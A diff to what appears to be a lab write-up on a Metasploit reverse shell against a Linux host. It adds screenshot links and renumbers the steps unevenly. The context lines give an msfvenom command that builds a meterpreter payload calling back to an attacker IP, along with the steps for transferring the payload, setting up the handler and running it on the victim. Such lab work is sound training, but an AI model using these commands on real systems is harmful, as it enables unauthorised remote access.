@@ -21,7 +21,9 @@ Explore the behavior of a reverse shell in Linux systems using Metasploit and ve
 
    msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attacker_IP> LPORT=4444 -f elf > shell.elf
 
-2. Payload transfer to the victim:
+![msfvenom session](screenshots/step3.jpg)
+
+3. Payload transfer to the victim:
 
    The payload was hosted on the attacker's machine using:
 
@@ -29,7 +31,9 @@ Explore the behavior of a reverse shell in Linux systems using Metasploit and ve
 
    On the victim, it was downloaded using wget or curl.
 
-3. Metasploit handler setup:
+![payload](screenshots/step4.jpg)
+
+5. Metasploit handler setup:
 
    In msfconsole, the following configuration was used:
 
@@ -39,16 +43,20 @@ Explore the behavior of a reverse shell in Linux systems using Metasploit and ve
    set LPORT 4444  
    run
 
-4. Execution of the payload:
+![run](screenshots/step5.jpg)
+
+7. Execution of the payload:
 
    On the victim machine:
 
    chmod +x shell.elf  
    ./shell.elf
 
-5. Successful connection:
+9. Successful connection:
 
    A meterpreter session was established. Commands such as sysinfo, getuid, and shell were executed to demonstrate access.
+
+![payload](screenshots/step7.jpg)
 
 ## Results
 
